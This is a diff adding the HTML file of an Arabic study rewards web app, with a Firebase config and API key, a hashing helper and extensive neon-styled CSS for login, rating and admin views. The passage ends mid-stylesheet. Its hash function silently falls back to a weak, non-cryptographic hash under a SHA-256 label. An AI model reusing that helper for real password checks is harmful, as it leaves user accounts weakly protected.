@@ -1,0 +1,2475 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>ذاكر هنا · نظام المكافآت</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800;900&family=Share+Tech+Mono&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/13.0.0/firebase-app.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/13.0.0/firebase-analytics.js";
+        import { getDatabase, ref, set, get, onValue, push, remove, update }
+            from "https://www.gstatic.com/firebasejs/13.0.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyAEdN2372ClPA1lUhVXtn0IpPzjhrXSXMg",
+            authDomain: "haga-37f7e.firebaseapp.com",
+            databaseURL: "https://haga-37f7e-default-rtdb.europe-west1.firebasedatabase.app",
+            projectId: "haga-37f7e",
+            storageBucket: "haga-37f7e.firebasestorage.app",
+            messagingSenderId: "554902437505",
+            appId: "1:554902437505:web:b5e33f6948243875dd1780",
+            measurementId: "G-E1XFN2ZHG7"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app);
+        const db = getDatabase(app);
+
+        window.db = db;
+        window.ref = ref;
+        window.set = set;
+        window.get = get;
+        window.onValue = onValue;
+        window.push = push;
+        window.remove = remove;
+        window.fbUpdate = update;
+
+        // ═══ Hash function (SHA-256 with fallback) ═══
+        async function sha256(str) {
+            try {
+                if (window.crypto && window.crypto.subtle && window.crypto.subtle.digest) {
+                    const buf = new TextEncoder().encode(str);
+                    const hash = await window.crypto.subtle.digest('SHA-256', buf);
+                    return Array.from(new Uint8Array(hash))
+                        .map(b => b.toString(16).padStart(2, '0')).join('');
+                }
+            } catch (e) {}
+            let h1 = 0xdeadbeef, h2 = 0x41c6ce57;
+            for (let i = 0; i < str.length; i++) {
+                const ch = str.charCodeAt(i);
+                h1 = Math.imul(h1 ^ ch, 2654435761);
+                h2 = Math.imul(h2 ^ ch, 1597334677);
+            }
+            h1 = Math.imul(h1 ^ (h1 >>> 16), 2246822507) ^ Math.imul(h2 ^ (h2 >>> 13), 3266489909);
+            h2 = Math.imul(h2 ^ (h2 >>> 16), 2246822507) ^ Math.imul(h1 ^ (h1 >>> 13), 3266489909);
+            return (h2 >>> 0).toString(16).padStart(8, '0') + (h1 >>> 0).toString(16).padStart(8, '0');
+        }
+
+        window.fbSha256 = sha256;
+        console.log("🔥 Firebase ready");
+    </script>
+
+    <style>
+        :root {
+            --bg: #04060a;
+            --border: rgba(0, 255, 136, 0.25);
+            --green: #00ff88;
+            --green-dim: #00b862;
+            --cyan: #00e5ff;
+            --pink: #ff2e88;
+            --gold: #ffd700;
+            --text: #b8ffdc;
+            --text-dim: #6ec7a0;
+            --text-muted: #4a6a5a;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { height: 100%; }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: radial-gradient(ellipse at 50% -20%, #0a2018 0%, #060a08 45%, #020305 100%);
+            color: var(--text);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        #matrixCanvas { position: fixed; inset: 0; z-index: 0; opacity: 0.38; pointer-events: none; }
+        .cyber-grid {
+            position: fixed; inset: 0; z-index: 1; pointer-events: none;
+            background-image:
+                linear-gradient(rgba(0, 255, 136, 0.045) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 136, 0.045) 1px, transparent 1px);
+            background-size: 44px 44px;
+            mask-image: radial-gradient(ellipse at 50% 40%, rgba(0,0,0,0.9) 30%, transparent 85%);
+            -webkit-mask-image: radial-gradient(ellipse at 50% 40%, rgba(0,0,0,0.9) 30%, transparent 85%);
+        }
+        .scanlines {
+            position: fixed; inset: 0; z-index: 2; pointer-events: none;
+            background: repeating-linear-gradient(to bottom,
+                transparent 0, transparent 2px,
+                rgba(0, 255, 136, 0.02) 3px, rgba(0, 255, 136, 0.02) 4px);
+            mix-blend-mode: overlay;
+        }
+        .floating-code { position: fixed; inset: 0; z-index: 3; pointer-events: none; overflow: hidden; }
+        .floating-code span {
+            position: absolute; color: var(--green);
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 15px; opacity: 0; white-space: nowrap;
+            text-shadow: 0 0 10px var(--green), 0 0 20px rgba(0,255,136,0.5);
+            animation: floatCode linear infinite; user-select: none;
+        }
+        .floating-code span.emo {
+            font-family: 'Cairo', sans-serif; font-size: 22px;
+            text-shadow: 0 0 14px rgba(0,255,136,0.6);
+            filter: hue-rotate(80deg) saturate(1.2);
+        }
+        @keyframes floatCode {
+            0% { transform: translateY(110vh) rotate(0deg) scale(0.7); opacity: 0; }
+            10% { opacity: 0.55; } 85% { opacity: 0.55; }
+            100% { transform: translateY(-15vh) rotate(35deg) scale(1.05); opacity: 0; }
+        }
+
+        .app-shell {
+            position: relative; z-index: 10;
+            width: 100%; max-width: 950px;
+            margin: 0 auto; padding: 26px 16px 60px;
+        }
+
+        .view { display: none; }
+        .view.active { display: block; animation: viewIn 0.55s cubic-bezier(0.2, 0.9, 0.3, 1); }
+        @keyframes viewIn {
+            from { opacity: 0; transform: translateY(24px) scale(0.98); filter: blur(4px); }
+            to { opacity: 1; transform: translateY(0) scale(1); filter: blur(0); }
+        }
+
+        .panel {
+            background: linear-gradient(160deg, rgba(8, 18, 16, 0.92), rgba(4, 8, 12, 0.97));
+            border: 1px solid var(--border);
+            border-radius: 22px;
+            padding: 40px 30px 34px;
+            box-shadow: 0 0 80px rgba(0, 255, 136, 0.06), inset 0 0 100px rgba(0, 255, 136, 0.025);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            position: relative;
+            overflow: hidden;
+        }
+        .panel::before, .panel::after { content: ''; position: absolute; left: 0; right: 0; height: 1px; }
+        .panel::before { top: 0; background: linear-gradient(90deg, transparent, var(--green), var(--cyan), transparent); opacity: 0.7; }
+        .panel::after { bottom: 0; background: linear-gradient(90deg, transparent, var(--cyan), var(--green), transparent); opacity: 0.7; }
+
+        .terminal-bar {
+            display: flex; align-items: center; gap: 8px;
+            padding: 10px 14px; background: rgba(0, 0, 0, 0.55);
+            border: 1px solid rgba(0, 255, 136, 0.15);
+            border-radius: 12px; margin-bottom: 26px;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 12.5px; color: var(--text-dim);
+            direction: ltr;
+        }
+        .terminal-bar .dot { width: 11px; height: 11px; border-radius: 50%; display: inline-block; box-shadow: 0 0 8px currentColor; }
+        .dot.red { background: #ff4d4d; color: #ff4d4d; }
+        .dot.yellow { background: #ffcc00; color: #ffcc00; }
+        .dot.green { background: var(--green); color: var(--green); }
+        .terminal-path { margin-left: 12px; color: var(--green); opacity: 0.75; }
+        .terminal-path::after { content: '_'; animation: blink 1s steps(2) infinite; margin-left: 2px; color: var(--green); }
+        @keyframes blink { 50% { opacity: 0; } }
+
+        .brand { display: flex; align-items: center; gap: 20px; margin-bottom: 28px; }
+        .brand-icon {
+            width: 74px; height: 74px;
+            background: linear-gradient(145deg, #001a10, #003d24);
+            border: 1.5px solid var(--green);
+            border-radius: 22px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 34px; color: var(--green);
+            box-shadow: 0 0 25px rgba(0, 255, 136, 0.35), inset 0 0 20px rgba(0, 255, 136, 0.15);
+            flex-shrink: 0;
+            animation: iconPulse 2.6s infinite alternate;
+            text-shadow: 0 0 14px var(--green);
+        }
+        @keyframes iconPulse {
+            0% { box-shadow: 0 0 22px rgba(0,255,136,0.35), inset 0 0 18px rgba(0,255,136,0.15); transform: scale(1); }
+            100% { box-shadow: 0 0 45px rgba(0,255,136,0.6), inset 0 0 30px rgba(0,255,136,0.25); transform: scale(1.04); }
+        }
+        .brand-text h1 {
+            font-family: 'Cairo', sans-serif;
+            font-size: clamp(28px, 5vw, 42px);
+            font-weight: 900; color: var(--green);
+            text-shadow: 0 0 22px rgba(0,255,136,0.55), 0 0 4px rgba(0,255,136,0.8);
+            letter-spacing: 0.5px; line-height: 1.1;
+            position: relative; display: inline-block;
+        }
+        .brand-text h1::before, .brand-text h1::after {
+            content: attr(data-text); position: absolute; inset: 0;
+            pointer-events: none; opacity: 0;
+        }
+        .brand-text h1::before {
+            color: var(--cyan); text-shadow: 0 0 10px var(--cyan);
+            animation: glitch1 4.2s infinite;
+            clip-path: polygon(0 0, 100% 0, 100% 42%, 0 42%);
+        }
+        .brand-text h1::after {
+            color: var(--pink); text-shadow: 0 0 10px var(--pink);
+            animation: glitch2 3.6s infinite;
+            clip-path: polygon(0 58%, 100% 58%, 100% 100%, 0 100%);
+        }
+        @keyframes glitch1 {
+            0%, 88%, 100% { transform: translate(0); opacity: 0; }
+            90% { transform: translate(-3px, -1px); opacity: 1; }
+            93% { transform: translate(2px, 1px); opacity: 1; }
+            96% { transform: translate(-1px, 2px); opacity: 0.8; }
+        }
+        @keyframes glitch2 {
+            0%, 86%, 100% { transform: translate(0); opacity: 0; }
+            89% { transform: translate(3px, 1px); opacity: 1; }
+            92% { transform: translate(-2px, -1px); opacity: 1; }
+            95% { transform: translate(1px, 1px); opacity: 0.7; }
+        }
+        .brand-text span {
+            display: block; font-size: 13px;
+            font-weight: 500; color: var(--text-muted);
+            letter-spacing: 1.5px; margin-top: 4px;
+            font-family: 'Share Tech Mono', monospace; text-transform: uppercase;
+        }
+
+        .user-chip {
+            display: flex; align-items: center; gap: 10px;
+            padding: 10px 16px;
+            background: rgba(0, 255, 136, 0.06);
+            border: 1px solid rgba(0, 255, 136, 0.3);
+            border-radius: 40px;
+            font-size: 13px; font-weight: 700;
+            color: var(--green);
+            font-family: 'Share Tech Mono', monospace;
+            margin-bottom: 20px;
+            text-shadow: 0 0 8px rgba(0, 255, 136, 0.5);
+        }
+        .user-chip i { color: var(--cyan); }
+        .user-chip .uid {
+            color: var(--text-muted); font-size: 11px;
+            margin-right: auto; opacity: 0.8;
+        }
+
+        .reward-box {
+            background: linear-gradient(155deg, rgba(0, 40, 25, 0.6), rgba(0, 20, 15, 0.85));
+            border: 1px solid rgba(0, 255, 136, 0.35);
+            border-radius: 18px;
+            padding: 28px 26px; margin: 0 0 26px;
+            position: relative; overflow: hidden;
+            box-shadow: 0 0 40px rgba(0, 255, 136, 0.1), inset 0 0 40px rgba(0, 255, 136, 0.04);
+        }
+        .reward-box::before {
+            content: ''; position: absolute; top: -50%; right: -20%;
+            width: 300px; height: 300px;
+            background: radial-gradient(circle, rgba(0,255,136,0.15), transparent 65%);
+            pointer-events: none;
+        }
+        .reward-box::after {
+            content: '> ACCESS_GRANTED // SESSION_ACTIVE';
+            position: absolute; bottom: 8px; left: 14px;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 10px; color: var(--green);
+            opacity: 0.35; letter-spacing: 1px;
+        }
+        .badge {
+            display: inline-flex; align-items: center; gap: 8px;
+            background: linear-gradient(135deg, var(--green), var(--green-dim));
+            padding: 5px 16px; border-radius: 30px;
+            font-size: 12px; font-weight: 800;
+            color: #00170d; letter-spacing: 0.6px;
+            margin-bottom: 14px;
+            box-shadow: 0 0 22px rgba(0, 255, 136, 0.5);
+        }
+        .badge i { color: #00170d; }
+        .reward-box h2 {
+            font-size: clamp(20px, 3.4vw, 26px);
+            font-weight: 900; color: var(--text);
+            margin-bottom: 12px; text-shadow: 0 0 12px rgba(0, 255, 136, 0.35);
+        }
+        .reward-box p { font-size: 15.5px; line-height: 1.95; color: var(--text-dim); font-weight: 500; }
+        .reward-box .highlight {
+            background: linear-gradient(135deg, rgba(0,255,136,0.18), rgba(0,229,255,0.18));
+            border: 1px solid rgba(0, 255, 136, 0.45);
+            padding: 2px 12px; border-radius: 8px;
+            color: var(--green); font-weight: 800;
+            display: inline-block;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 14.5px;
+            text-shadow: 0 0 8px rgba(0,255,136,0.6);
+        }
+
+        .btn-neon {
+            position: relative; width: 100%;
+            background: transparent; border: 1.5px solid var(--green);
+            color: var(--green); padding: 18px 26px;
+            border-radius: 14px; font-family: 'Cairo', sans-serif;
+            font-size: 18px; font-weight: 800; cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            overflow: hidden; letter-spacing: 0.4px;
+            text-shadow: 0 0 10px rgba(0,255,136,0.65);
+            box-shadow: 0 0 22px rgba(0, 255, 136, 0.22), inset 0 0 22px rgba(0, 255, 136, 0.05);
+            display: flex; align-items: center; justify-content: center; gap: 12px;
+            margin-top: 4px;
+        }
+        .btn-neon::before {
+            content: ''; position: absolute; inset: 0;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 136, 0.35), transparent);
+            transform: translateX(-100%); transition: transform 0.7s;
+        }
+        .btn-neon:hover:not(:disabled)::before { transform: translateX(100%); }
+        .btn-neon:hover:not(:disabled) {
+            background: rgba(0, 255, 136, 0.08);
+            box-shadow: 0 0 45px rgba(0, 255, 136, 0.55), inset 0 0 30px rgba(0, 255, 136, 0.12);
+            transform: translateY(-3px);
+        }
+        .btn-neon:active:not(:disabled) { transform: scale(0.97); }
+        .btn-neon:disabled { opacity: 0.4; cursor: not-allowed; }
+        .btn-neon.cyan { border-color: var(--cyan); color: var(--cyan); text-shadow: 0 0 10px rgba(0,229,255,0.65); box-shadow: 0 0 22px rgba(0,229,255,0.22), inset 0 0 22px rgba(0,229,255,0.05); }
+        .btn-neon.cyan:hover:not(:disabled) { background: rgba(0,229,255,0.08); box-shadow: 0 0 45px rgba(0,229,255,0.55), inset 0 0 30px rgba(0,229,255,0.12); }
+        .btn-neon.gold { border-color: var(--gold); color: var(--gold); text-shadow: 0 0 10px rgba(255,215,0,0.65); box-shadow: 0 0 22px rgba(255,215,0,0.22), inset 0 0 22px rgba(255,215,0,0.05); }
+        .btn-neon.gold:hover:not(:disabled) { background: rgba(255,215,0,0.08); box-shadow: 0 0 45px rgba(255,215,0,0.55), inset 0 0 30px rgba(255,215,0,0.12); }
+
+        .works-header {
+            display: flex; align-items: center; gap: 16px;
+            margin-bottom: 26px; padding-bottom: 18px;
+            border-bottom: 1px dashed rgba(0, 255, 136, 0.25);
+        }
+        .btn-back {
+            width: 42px; height: 42px; flex-shrink: 0;
+            border-radius: 12px; border: 1.5px solid var(--border);
+            background: rgba(0, 255, 136, 0.06); color: var(--green);
+            font-size: 16px; cursor: pointer;
+            transition: all 0.3s;
+            display: flex; align-items: center; justify-content: center;
+        }
+        .btn-back:hover {
+            background: rgba(0, 255, 136, 0.15);
+            border-color: var(--green);
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.4);
+            transform: scale(1.05);
+        }
+        .works-title {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 24px; font-weight: 800;
+            color: var(--green);
+            text-shadow: 0 0 14px rgba(0,255,136,0.55);
+            letter-spacing: 1px;
+        }
+        .works-sub {
+            display: block; font-family: 'Share Tech Mono', monospace;
+            font-size: 11px; color: var(--text-muted);
+            letter-spacing: 1.5px; margin-top: 2px; text-transform: uppercase;
+        }
+
+        .works-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 20px;
+        }
+        .work-card {
+            background: linear-gradient(160deg, rgba(0, 25, 18, 0.55), rgba(4, 10, 12, 0.85));
+            border: 1px solid rgba(0, 255, 136, 0.22);
+            border-radius: 18px; overflow: hidden;
+            transition: all 0.35s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            position: relative;
+        }
+        .work-card::before {
+            content: ''; position: absolute; top: 0; right: 0;
+            width: 46px; height: 3px; background: var(--green);
+            box-shadow: 0 0 14px var(--green); z-index: 2;
+        }
+        .work-card::after {
+            content: ''; position: absolute; inset: 0;
+            pointer-events: none;
+            background: linear-gradient(180deg, transparent 60%, rgba(0,0,0,0.85) 100%);
+            z-index: 1;
+        }
+        .work-card:hover {
+            border-color: var(--green);
+            box-shadow: 0 0 38px rgba(0, 255, 136, 0.3), inset 0 0 40px rgba(0, 255, 136, 0.05);
+            transform: translateY(-5px);
+        }
+        .work-card.private-work::before { background: var(--cyan); box-shadow: 0 0 14px var(--cyan); }
+        .work-image {
+            width: 100%; height: 190px;
+            object-fit: cover; display: block;
+            filter: contrast(1.05) saturate(0.9) brightness(0.92);
+            transition: filter 0.35s;
+        }
+        .work-card:hover .work-image { filter: contrast(1.1) saturate(1.1) brightness(1); }
+        .work-body { padding: 16px 16px 18px; position: relative; z-index: 2; }
+        .work-title {
+            font-size: 17px; font-weight: 800;
+            color: var(--green); margin-bottom: 6px;
+            text-shadow: 0 0 10px rgba(0,255,136,0.5);
+            display: flex; align-items: center; gap: 8px;
+        }
+        .work-title::before {
+            content: '>'; color: var(--cyan);
+            font-family: 'Share Tech Mono', monospace; font-weight: 400;
+        }
+        .work-info {
+            font-size: 13.5px; color: var(--text-dim);
+            line-height: 1.75; margin-bottom: 10px; min-height: 24px;
+        }
+        .work-meta {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 10.5px; color: var(--text-muted);
+            letter-spacing: 1px; margin-bottom: 12px;
+            display: flex; gap: 12px; flex-wrap: wrap;
+            align-items: center;
+        }
+        .work-meta span { display: inline-flex; align-items: center; gap: 4px; }
+        .work-meta i { color: var(--green); opacity: 0.7; }
+
+        .private-tag {
+            display: inline-flex; align-items: center; gap: 4px;
+            background: rgba(0, 229, 255, 0.12);
+            border: 1px solid rgba(0, 229, 255, 0.5);
+            color: var(--cyan);
+            font-size: 10px;
+            padding: 2px 8px; border-radius: 20px;
+            font-family: 'Share Tech Mono', monospace;
+            letter-spacing: 0.6px;
+            font-weight: 700;
+        }
+
+        .rating-block {
+            border-top: 1px dashed rgba(0, 255, 136, 0.2);
+            padding-top: 12px; margin-top: 4px;
+        }
+        .rating-label {
+            font-size: 11.5px;
+            font-family: 'Share Tech Mono', monospace;
+            color: var(--text-muted);
+            letter-spacing: 1.2px; text-transform: uppercase;
+            margin-bottom: 6px;
+        }
+        .stars {
+            display: flex; gap: 5px;
+            direction: ltr; justify-content: flex-start;
+            margin-bottom: 6px; user-select: none;
+        }
+        .stars i {
+            font-size: 22px; color: rgba(255, 255, 255, 0.12);
+            cursor: pointer; transition: all 0.2s ease;
+        }
+        .stars i.hover, .stars i.lit { color: var(--gold); text-shadow: 0 0 14px rgba(255, 215, 0, 0.75); }
+        .stars i:hover { transform: scale(1.18) rotate(-4deg); }
+        .stars.locked i { cursor: default; }
+        .stars.locked i:hover { transform: none; }
+        .rating-summary {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 12px; color: var(--text-dim);
+            letter-spacing: 0.6px;
+        }
+        .rating-summary b { color: var(--gold); font-weight: 800; }
+        .rating-user { font-size: 12px; color: var(--gold); font-weight: 700; margin-top: 4px; }
+
+        .works-empty {
+            text-align: center; padding: 50px 20px;
+            color: var(--text-muted);
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 14px; letter-spacing: 1px;
+            border: 1px dashed rgba(0, 255, 136, 0.2);
+            border-radius: 16px;
+        }
+        .works-empty i {
+            display: block; font-size: 42px;
+            margin-bottom: 14px; color: var(--green); opacity: 0.35;
+        }
+
+        .footer {
+            margin-top: 30px; text-align: center;
+            font-size: 12px; color: var(--text-muted);
+            letter-spacing: 0.6px;
+            border-top: 1px dashed rgba(0, 255, 136, 0.2);
+            padding-top: 20px;
+            font-family: 'Share Tech Mono', monospace;
+        }
+        .footer i { margin: 0 4px; color: var(--green); opacity: 0.7; }
+
+        .login-hero { text-align: center; margin-bottom: 26px; }
+        .login-hero .logo-big {
+            width: 96px; height: 96px; margin: 0 auto 16px;
+            border-radius: 26px;
+            background: linear-gradient(145deg, #001a10, #003d24);
+            border: 1.5px solid var(--green);
+            display: flex; align-items: center; justify-content: center;
+            font-size: 44px; color: var(--green);
+            box-shadow: 0 0 45px rgba(0, 255, 136, 0.5), inset 0 0 25px rgba(0, 255, 136, 0.15);
+            animation: iconPulse 2.6s infinite alternate;
+            text-shadow: 0 0 18px var(--green);
+        }
+        .login-hero h2 {
+            font-size: 26px; font-weight: 900;
+            color: var(--green);
+            text-shadow: 0 0 18px rgba(0,255,136,0.55);
+            margin-bottom: 6px;
+        }
+        .login-hero p {
+            font-size: 13px; color: var(--text-muted);
+            font-family: 'Share Tech Mono', monospace;
+            letter-spacing: 1px;
+        }
+
+        .form-section { display: flex; flex-direction: column; gap: 16px; animation: formSlide 0.7s cubic-bezier(0.23, 1, 0.32, 1); }
+        @keyframes formSlide {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .input-group { position: relative; }
+        .input-group .icon {
+            position: absolute; right: 18px; top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-muted); font-size: 17px;
+            transition: all 0.3s; pointer-events: none;
+        }
+        .input-group input {
+            width: 100%; padding: 17px 52px 17px 20px;
+            background: rgba(0, 0, 0, 0.45);
+            border: 1px solid rgba(0, 255, 136, 0.25);
+            border-radius: 12px;
+            font-family: 'Cairo', sans-serif;
+            font-size: 15.5px; color: var(--text);
+            transition: all 0.3s; outline: none;
+            font-weight: 500;
+        }
+        .input-group input::placeholder { color: var(--text-muted); font-weight: 400; }
+        .input-group input:focus {
+            border-color: var(--green);
+            background: rgba(0, 20, 12, 0.7);
+            box-shadow: 0 0 0 3px rgba(0, 255, 136, 0.12), 0 0 22px rgba(0, 255, 136, 0.25);
+        }
+        .input-group input:focus ~ .icon { color: var(--green); }
+
+        .login-error {
+            color: var(--pink); font-size: 13px;
+            font-weight: 700; text-align: center;
+            min-height: 18px;
+            font-family: 'Share Tech Mono', monospace;
+            text-shadow: 0 0 10px rgba(255, 46, 136, 0.5);
+        }
+        .login-note {
+            font-size: 11.5px; color: var(--text-muted);
+            text-align: center;
+            font-family: 'Share Tech Mono', monospace;
+            letter-spacing: 0.4px; line-height: 1.7;
+            margin-top: 8px;
+        }
+        .login-note i { color: var(--cyan); }
+
+        .admin-fab {
+            position: fixed; bottom: 22px; left: 22px;
+            width: 54px; height: 54px; border-radius: 50%;
+            background: rgba(0, 20, 14, 0.92);
+            border: 1.5px solid var(--border);
+            color: var(--green); font-size: 20px;
+            cursor: pointer; z-index: 90;
+            box-shadow: 0 0 24px rgba(0, 255, 136, 0.35);
+            transition: all 0.3s;
+            display: flex; align-items: center; justify-content: center;
+            backdrop-filter: blur(10px);
+        }
+        .admin-fab:hover { transform: scale(1.1) translateY(-3px); box-shadow: 0 0 40px rgba(0, 255, 136, 0.7); border-color: var(--green); }
+        .admin-fab:active { transform: scale(0.94); }
+
+        .admin-modal {
+            position: fixed; inset: 0; z-index: 300;
+            background: rgba(0, 5, 8, 0.9);
+            backdrop-filter: blur(16px);
+            display: none; justify-content: center;
+            align-items: flex-start; padding: 22px 14px;
+            overflow-y: auto;
+        }
+        .admin-modal.active { display: flex; }
+        .admin-box {
+            width: 100%; max-width: 720px;
+            background: linear-gradient(160deg, rgba(8, 20, 16, 0.98), rgba(2, 8, 8, 0.99));
+            border: 1px solid var(--border);
+            border-radius: 22px;
+            padding: 34px 28px 26px;
+            position: relative;
+            box-shadow: 0 0 100px rgba(0, 255, 136, 0.15), inset 0 0 60px rgba(0, 255, 136, 0.03);
+            animation: adminIn 0.5s cubic-bezier(0.23, 1, 0.32, 1);
+            margin: auto 0;
+        }
+        @keyframes adminIn {
+            from { opacity: 0; transform: translateY(40px) scale(0.96); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+        .admin-close {
+            position: absolute; top: 14px; left: 14px;
+            width: 38px; height: 38px; border-radius: 50%;
+            border: 1.5px solid rgba(255, 46, 136, 0.4);
+            background: transparent; color: var(--pink);
+            font-size: 16px; cursor: pointer;
+            transition: all 0.25s;
+            display: flex; align-items: center; justify-content: center;
+        }
+        .admin-close:hover {
+            background: rgba(255, 46, 136, 0.15);
+            border-color: var(--pink);
+            box-shadow: 0 0 22px rgba(255, 46, 136, 0.55);
+            transform: rotate(90deg);
+        }
+        .admin-head { text-align: center; margin-bottom: 24px; }
+        .admin-head .shield {
+            width: 68px; height: 68px; margin: 0 auto 14px;
+            border-radius: 20px;
+            background: linear-gradient(145deg, rgba(0, 255, 136, 0.15), rgba(0, 229, 255, 0.15));
+            border: 1.5px solid var(--green);
+            color: var(--green); font-size: 28px;
+            display: flex; align-items: center; justify-content: center;
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.5);
+            text-shadow: 0 0 12px var(--green);
+        }
+        .admin-head h3 {
+            font-size: 22px; font-weight: 900;
+            color: var(--green); margin-bottom: 6px;
+            text-shadow: 0 0 14px rgba(0, 255, 136, 0.5);
+        }
+        .admin-head p {
+            font-size: 13px; color: var(--text-muted);
+            font-weight: 500;
+            font-family: 'Share Tech Mono', monospace;
+            letter-spacing: 0.5px;
+        }
+        .admin-step { display: none; }
+        .admin-step.active { display: block; animation: formSlide 0.4s ease; }
+
+        .admin-field { position: relative; margin-bottom: 14px; }
+        .admin-field .icon {
+            position: absolute; right: 16px; top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-muted); font-size: 16px;
+            pointer-events: none; transition: color 0.3s;
+        }
+        .admin-field input,
+        .admin-field textarea {
+            width: 100%; padding: 15px 46px 15px 16px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(0, 255, 136, 0.25);
+            border-radius: 12px;
+            font-family: 'Cairo', sans-serif;
+            font-size: 14.5px; color: var(--text);
+            outline: none; transition: all 0.3s;
+            font-weight: 500;
+        }
+        .admin-field textarea { min-height: 100px; resize: vertical; line-height: 1.7; padding-top: 13px; }
+        .admin-field input::placeholder, .admin-field textarea::placeholder { color: var(--text-muted); }
+        .admin-field input:focus, .admin-field textarea:focus {
+            border-color: var(--green);
+            background: rgba(0, 20, 14, 0.75);
+            box-shadow: 0 0 0 3px rgba(0, 255, 136, 0.12), 0 0 22px rgba(0, 255, 136, 0.25);
+        }
+        .admin-field input:focus ~ .icon, .admin-field textarea:focus ~ .icon { color: var(--green); }
+
+        .admin-btn {
+            width: 100%; padding: 15px;
+            border: 1.5px solid var(--green);
+            border-radius: 12px;
+            background: rgba(0, 255, 136, 0.1);
+            color: var(--green);
+            font-family: 'Cairo', sans-serif;
+            font-size: 16px; font-weight: 800;
+            cursor: pointer; transition: all 0.3s;
+            box-shadow: 0 0 22px rgba(0, 255, 136, 0.22), inset 0 0 22px rgba(0, 255, 136, 0.06);
+            display: flex; align-items: center; justify-content: center; gap: 10px;
+            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
+        }
+        .admin-btn:hover:not(:disabled) {
+            background: rgba(0, 255, 136, 0.2);
+            box-shadow: 0 0 40px rgba(0, 255, 136, 0.55), inset 0 0 30px rgba(0, 255, 136, 0.15);
+            transform: translateY(-2px);
+        }
+        .admin-btn:active:not(:disabled) { transform: scale(0.97); }
+        .admin-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+        .admin-btn.ghost {
+            background: transparent;
+            border-color: rgba(255, 46, 136, 0.4);
+            color: var(--pink); box-shadow: none;
+            text-shadow: 0 0 10px rgba(255, 46, 136, 0.4);
+        }
+        .admin-btn.ghost:hover:not(:disabled) {
+            background: rgba(255, 46, 136, 0.1);
+            border-color: var(--pink);
+            box-shadow: 0 0 26px rgba(255, 46, 136, 0.45);
+        }
+
+        .admin-error {
+            color: var(--pink); font-size: 12.5px;
+            font-weight: 700; text-align: center;
+            min-height: 18px; margin-top: 10px;
+            font-family: 'Share Tech Mono', monospace;
+        }
+
+        .admin-tabs {
+            display: flex; gap: 6px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            border-radius: 12px; padding: 5px;
+            margin-bottom: 20px; flex-wrap: wrap;
+        }
+        .admin-tab {
+            flex: 1 1 0; min-width: 90px;
+            padding: 11px 8px; border: none;
+            background: transparent; border-radius: 8px;
+            font-family: 'Cairo', sans-serif;
+            font-size: 13px; font-weight: 700;
+            color: var(--text-muted);
+            cursor: pointer; transition: all 0.3s;
+            display: flex; align-items: center; justify-content: center; gap: 5px;
+        }
+        .admin-tab.active {
+            background: rgba(0, 255, 136, 0.15);
+            color: var(--green);
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.25);
+            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
+        }
+
+        .admin-pane { display: none; }
+        .admin-pane.active { display: block; animation: formSlide 0.4s ease; }
+
+        .admin-label {
+            font-size: 12.5px; font-weight: 800;
+            color: var(--text-dim); margin: 0 2px 6px;
+            display: block;
+            font-family: 'Share Tech Mono', monospace;
+            letter-spacing: 0.8px; text-transform: uppercase;
+        }
+        .admin-section-title {
+            font-size: 12.5px; font-weight: 800;
+            color: var(--cyan); letter-spacing: 1px;
+            margin: 18px 2px 12px; padding-bottom: 8px;
+            border-bottom: 1px dashed rgba(0, 229, 255, 0.3);
+            display: flex; align-items: center; gap: 7px;
+            font-family: 'Share Tech Mono', monospace;
+            text-transform: uppercase;
+        }
+        .admin-section-title:first-child { margin-top: 0; }
+        .admin-hint {
+            font-size: 11.5px; color: var(--text-muted);
+            margin: 8px 2px 0; line-height: 1.7;
+            font-family: 'Share Tech Mono', monospace;
+            letter-spacing: 0.4px;
+        }
+
+        .upload-area {
+            border: 2px dashed rgba(0, 229, 255, 0.4);
+            background: rgba(0, 229, 255, 0.04);
+            border-radius: 14px;
